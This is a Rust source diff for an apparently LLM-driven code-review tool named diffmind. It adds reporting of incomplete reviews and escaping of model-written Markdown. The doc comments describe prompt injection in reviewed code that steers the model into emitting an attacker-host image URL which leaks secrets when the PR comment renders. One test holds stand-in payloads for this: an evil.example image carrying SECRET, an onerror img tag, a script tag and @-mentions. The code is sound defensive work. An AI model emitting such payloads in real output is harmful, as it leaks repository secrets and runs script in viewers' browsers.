@@ -150,8 +150,19 @@ pub fn cost_line(stats: &AnalysisStats) -> String {
     line
 }
 
-pub fn print_footer(shown: usize, gated: usize, stats: &AnalysisStats) {
+pub fn print_footer(shown: usize, gated: usize, stats: &AnalysisStats, required: bool) {
     eprintln!("  {}", "─".repeat(62).dark_grey());
+
+    if let Some(err) = &stats.backend_error {
+        eprintln!(
+            "  {}  review FAILED part-way: {} of {} unit{} not reviewed — {}",
+            "✗".red().bold(),
+            stats.units_failed,
+            stats.units_total,
+            plural(stats.units_total),
+            err
+        );
+    }
 
     if stats.units_unparseable > 0 {
         eprintln!(
@@ -217,7 +228,33 @@ pub fn print_footer(shown: usize, gated: usize, stats: &AnalysisStats) {
         eprintln!("  {}  {}", "·".dark_grey(), cost_line(stats));
     }
 
-    if shown == 0 {
+    let incomplete = !stats.is_complete();
+    if incomplete {
+        let consequence = if stats.backend_error.is_some() || required {
+            "the review is incomplete  (exit 2)".red().to_string()
+        } else {
+            "the result covers only the units that were reviewed"
+                .yellow()
+                .to_string()
+        };
+        eprintln!(
+            "  {}  {} of {} unit{} not reviewed — {}",
+            "!".yellow().bold(),
+            stats.units_skipped(),
+            stats.units_total,
+            plural(stats.units_total),
+            consequence
+        );
+    }
+
+    if shown == 0 && incomplete {
+        eprintln!(
+            "  {}  No issues found in the {} unit{} that were reviewed.",
+            "·".dark_grey(),
+            stats.units_reviewed(),
+            plural(stats.units_reviewed())
+        );
+    } else if shown == 0 {
         eprintln!("  {}  No issues found.", "✓".green().bold());
     } else {
         let gate = if gated > 0 {
@@ -251,7 +288,9 @@ pub fn render(
     summary: &ReviewSummary,
     stats: &AnalysisStats,
     model: &str,
+    required: bool,
 ) -> String {
+    let completeness = stats.completeness(required);
     match format {
         OutputFormat::Json => serde_json::to_string_pretty(&serde_json::json!({
             "version": VERSION,
@@ -272,14 +311,23 @@ pub fn render(
                 "discarded_unanchorable": stats.unanchorable,
                 "below_confidence": stats.below_confidence,
                 "files_skipped_by_triage": stats.files_skipped_by_triage,
-            }
+                "units_failed": stats.units_failed,
+            },
+            // Added in 0.9.3. Existing consumers ignore it; a gate that wants
+            // to know whether "no findings" covers the whole diff reads
+            // `completeness.trustworthy`.
+            "completeness": completeness,
         }))
         .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}")),
 
-        OutputFormat::Sarif => serde_json::to_string_pretty(&to_sarif(summary, VERSION, model))
-            .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}")),
+        OutputFormat::Sarif => {
+            let mut sarif = to_sarif(summary, VERSION, model);
+            core_engine::attach_completeness(&mut sarif, &completeness);
+            serde_json::to_string_pretty(&sarif)
+                .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
+        }
 
-        OutputFormat::Markdown => markdown(summary, stats, model),
+        OutputFormat::Markdown => markdown(summary, stats, model, required),
 
         // Text is streamed to stderr as findings arrive, so there is no
         // document to return here.
@@ -287,11 +335,43 @@ pub fn render(
     }
 }
 
-pub fn markdown(summary: &ReviewSummary, stats: &AnalysisStats, model: &str) -> String {
+pub fn markdown(
+    summary: &ReviewSummary,
+    stats: &AnalysisStats,
+    model: &str,
+    required: bool,
+) -> String {
     let mut out = String::from("## diffmind code review\n\n");
 
+    // Said first, before any "No issues found": that sentence is only true of
+    // the units that were actually reviewed.
+    if !stats.is_complete() {
+        let verdict = if stats.backend_error.is_some() {
+            "**Review failed part-way.**"
+        } else if required {
+            "**Review incomplete — this run fails.**"
+        } else {
+            "**Review incomplete.**"
+        };
+        out.push_str(&format!(
+            "> [!WARNING]\n> {verdict} {} of {} unit{} were not reviewed \
+             ({} unparseable, {} too large, {} backend failure). \
+             A clean result says nothing about them.\n\n",
+            stats.units_skipped(),
+            stats.units_total,
+            plural(stats.units_total),
+            stats.units_unparseable,
+            stats.units_too_large,
+            stats.units_failed,
+        ));
+    }
+
     if summary.findings.is_empty() {
-        out.push_str("No issues found.\n\n");
+        if stats.is_complete() {
+            out.push_str("No issues found.\n\n");
+        } else {
+            out.push_str("No issues found in the units that were reviewed.\n\n");
+        }
     } else {
         let high = summary
             .findings
@@ -317,12 +397,11 @@ pub fn markdown(summary: &ReviewSummary, stats: &AnalysisStats, model: &str) -> 
         out.push_str("| Severity | Location | Rule | Issue |\n|---|---|---|---|\n");
         for f in &summary.findings {
             out.push_str(&format!(
-                "| {} | `{}:{}` | `{}` | {} |\n",
+                "| {} | {} | {} | {} |\n",
                 f.severity.as_str(),
-                f.file,
-                f.line,
-                f.rule_id(),
-                escape_pipes(&f.issue),
+                code_span(&format!("{}:{}", f.file, f.line)),
+                code_span(&f.rule_id()),
+                escape_markdown(&f.issue),
             ));
         }
         out.push('\n');
@@ -333,8 +412,9 @@ pub fn markdown(summary: &ReviewSummary, stats: &AnalysisStats, model: &str) -> 
                 continue;
             }
             out.push_str(&format!(
-                "- **`{}:{}`** — {}\n",
-                f.file, f.line, f.suggested_fix
+                "- **{}** — {}\n",
+                code_span(&format!("{}:{}", f.file, f.line)),
+                escape_markdown(&f.suggested_fix)
             ));
         }
         out.push_str("\n</details>\n\n");
@@ -343,7 +423,7 @@ pub fn markdown(summary: &ReviewSummary, stats: &AnalysisStats, model: &str) -> 
     if !summary.positives.is_empty() {
         out.push_str("### What looks good\n\n");
         for p in &summary.positives {
-            out.push_str(&format!("- {p}\n"));
+            out.push_str(&format!("- {}\n", escape_markdown(p)));
         }
         out.push('\n');
     }
@@ -351,13 +431,15 @@ pub fn markdown(summary: &ReviewSummary, stats: &AnalysisStats, model: &str) -> 
     if !summary.suggestions.is_empty() {
         out.push_str("### Suggestions\n\n");
         for s in &summary.suggestions {
-            out.push_str(&format!("- {s}\n"));
+            out.push_str(&format!("- {}\n", escape_markdown(s)));
         }
         out.push('\n');
     }
 
     out.push_str(&format!(
-        "<sub>diffmind {VERSION} · {model} · {} chunk{} analyzed",
+        "<sub>diffmind {VERSION} · {} · {}/{} chunk{} analyzed",
+        escape_markdown(model),
+        stats.units_reviewed(),
         stats.units_total,
         plural(stats.units_total)
     ));
@@ -369,9 +451,49 @@ pub fn markdown(summary: &ReviewSummary, stats: &AnalysisStats, model: &str) -> 
     out
 }
 
-/// A `|` in a finding would end the Markdown table cell early.
-fn escape_pipes(s: &str) -> String {
-    s.replace('|', "\\|").replace('\n', " ")
+/// Make model-written text inert Markdown.
+///
+/// The report is posted as a PR comment and a job summary, both rendered by
+/// GitHub. Model text derives from the code under review, so a planted
+/// instruction can make it emit an image (`![](https://attacker/?q=<secret>)`,
+/// fetched as soon as the comment renders — an exfiltration channel), raw
+/// HTML, links or `@`-mentions that notify strangers. Every character that
+/// Markdown or HTML would interpret is escaped, `@` is neutralised, and
+/// newlines are flattened so text cannot break out of its table cell.
+fn escape_markdown(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '\n' | '\r' => out.push(' '),
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '@' => out.push_str("&#64;"),
+            '\\' | '`' | '*' | '_' | '[' | ']' | '(' | ')' | '!' | '|' | '#' | '~' => {
+                out.push('\\');
+                out.push(c);
+            }
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
+/// Inline code that cannot be closed early by a backtick in the content.
+fn code_span(s: &str) -> String {
+    let flat: String = s
+        .chars()
+        .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
+        .collect();
+    let longest = flat.split(|c| c != '`').map(str::len).max().unwrap_or(0);
+    let fence = "`".repeat(longest + 1);
+    // A pipe would still end the table cell inside a code span.
+    let body = flat.replace('|', "\\|");
+    if body.starts_with('`') || body.ends_with('`') {
+        format!("{fence} {body} {fence}")
+    } else {
+        format!("{fence}{body}{fence}")
+    }
 }
 
 #[cfg(test)]
@@ -408,6 +530,7 @@ mod tests {
             &summary(),
             &AnalysisStats::default(),
             "m",
+            false,
         );
         let v: serde_json::Value = serde_json::from_str(&s).expect("must be valid JSON");
         assert_eq!(v["findings"].as_array().unwrap().len(), 1);
@@ -422,6 +545,7 @@ mod tests {
             &summary(),
             &AnalysisStats::default(),
             "m",
+            false,
         );
         let v: serde_json::Value = serde_json::from_str(&s).unwrap();
         assert_eq!(v["version"], "2.1.0");
@@ -431,7 +555,13 @@ mod tests {
     fn markdown_escapes_pipes_so_the_table_survives() {
         let mut s = summary();
         s.findings[0].issue = "use a || b, not a | b".into();
-        let md = render(OutputFormat::Markdown, &s, &AnalysisStats::default(), "m");
+        let md = render(
+            OutputFormat::Markdown,
+            &s,
+            &AnalysisStats::default(),
+            "m",
+            false,
+        );
         let row = md.lines().find(|l| l.contains("src/a.rs")).unwrap();
 
         // Splitting on unescaped pipes must still yield exactly the four
@@ -476,11 +606,125 @@ mod tests {
         cells
     }
 
+    /// Model text comes from code under review, so planted instructions can
+    /// steer it. Rendered in a PR comment, an image is fetched immediately —
+    /// a way to smuggle repository content out in a URL — and HTML, links and
+    /// mentions are live. None of that may survive into the Markdown.
+    #[test]
+    fn markdown_neutralises_images_links_html_and_mentions_in_model_text() {
+        let mut s = summary();
+        s.findings[0].issue =
+            "see ![x](https://evil.example/?q=SECRET) <img src=x onerror=alert(1)> @octocat [click](https://evil.example)".into();
+        s.findings[0].suggested_fix = "<script>alert(1)</script> **bold** `code`".into();
+        s.positives = vec!["![p](https://evil.example/p.png)".into()];
+        s.suggestions = vec!["<details open>".into()];
+        let md = render(
+            OutputFormat::Markdown,
+            &s,
+            &AnalysisStats::default(),
+            "m",
+            false,
+        );
+
+        for live in ["![", "](", "<img", "<script", "<details open", "@octocat"] {
+            assert!(!md.contains(live), "{live:?} survived:\n{md}");
+        }
+        assert!(
+            md.contains("&lt;img"),
+            "HTML is shown as text, not dropped:\n{md}"
+        );
+        assert!(md.contains("&#64;octocat"));
+    }
+
+    #[test]
+    fn a_backtick_in_a_path_cannot_close_its_code_span() {
+        assert_eq!(code_span("a.rs:1"), "`a.rs:1`");
+        let span = code_span("we`ird.rs:3");
+        assert!(span.starts_with("``") && span.ends_with("``"), "{span}");
+    }
+
+    #[test]
+    fn an_incomplete_review_is_never_rendered_as_clean() {
+        let stats = AnalysisStats {
+            units_total: 3,
+            units_unparseable: 1,
+            ..Default::default()
+        };
+        let md = render(
+            OutputFormat::Markdown,
+            &ReviewSummary::default(),
+            &stats,
+            "m",
+            true,
+        );
+        assert!(md.contains("Review incomplete"), "{md}");
+        assert!(!md.contains("\nNo issues found.\n"), "{md}");
+
+        let json: serde_json::Value = serde_json::from_str(&render(
+            OutputFormat::Json,
+            &ReviewSummary::default(),
+            &stats,
+            "m",
+            true,
+        ))
+        .unwrap();
+        assert_eq!(json["completeness"]["status"], "incomplete");
+        assert_eq!(json["completeness"]["trustworthy"], false);
+        assert_eq!(json["completeness"]["units_reviewed"], 2);
+        assert_eq!(json["completeness"]["required"], true);
+
+        let sarif: serde_json::Value = serde_json::from_str(&render(
+            OutputFormat::Sarif,
+            &ReviewSummary::default(),
+            &stats,
+            "m",
+            true,
+        ))
+        .unwrap();
+        assert_eq!(
+            sarif["runs"][0]["invocations"][0]["executionSuccessful"],
+            false
+        );
+        assert_eq!(
+            sarif["runs"][0]["properties"]["completeness"]["status"],
+            "incomplete"
+        );
+    }
+
+    #[test]
+    fn a_complete_review_reports_success_in_every_format() {
+        let stats = AnalysisStats {
+            units_total: 2,
+            ..Default::default()
+        };
+        let json: serde_json::Value =
+            serde_json::from_str(&render(OutputFormat::Json, &summary(), &stats, "m", true))
+                .unwrap();
+        assert_eq!(json["completeness"]["status"], "complete");
+        assert_eq!(json["completeness"]["trustworthy"], true);
+        let sarif: serde_json::Value =
+            serde_json::from_str(&render(OutputFormat::Sarif, &summary(), &stats, "m", true))
+                .unwrap();
+        assert_eq!(
+            sarif["runs"][0]["invocations"][0]["executionSuccessful"],
+            true
+        );
+        // The pre-0.9.3 shape is still there for existing consumers.
+        assert!(json["stats"]["units_unparseable"].is_number());
+        assert!(sarif["runs"][0]["results"].is_array());
+    }
+
     #[test]
     fn markdown_flattens_newlines_out_of_a_table_cell() {
         let mut s = summary();
         s.findings[0].issue = "line one\nline two".into();
-        let md = render(OutputFormat::Markdown, &s, &AnalysisStats::default(), "m");
+        let md = render(
+            OutputFormat::Markdown,
+            &s,
+            &AnalysisStats::default(),
+            "m",
+            false,
+        );
         let row = md.lines().find(|l| l.contains("src/a.rs")).unwrap();
         assert!(
             row.contains("line one line two"),
@@ -495,6 +739,7 @@ mod tests {
             &ReviewSummary::default(),
             &AnalysisStats::default(),
             "m",
+            false,
         );
         assert!(md.contains("No issues found."));
         assert!(!md.contains("| Severity |"));
@@ -507,7 +752,8 @@ mod tests {
                 OutputFormat::Text,
                 &summary(),
                 &AnalysisStats::default(),
-                "m"
+                "m",
+                false
             )
             .is_empty()
         );
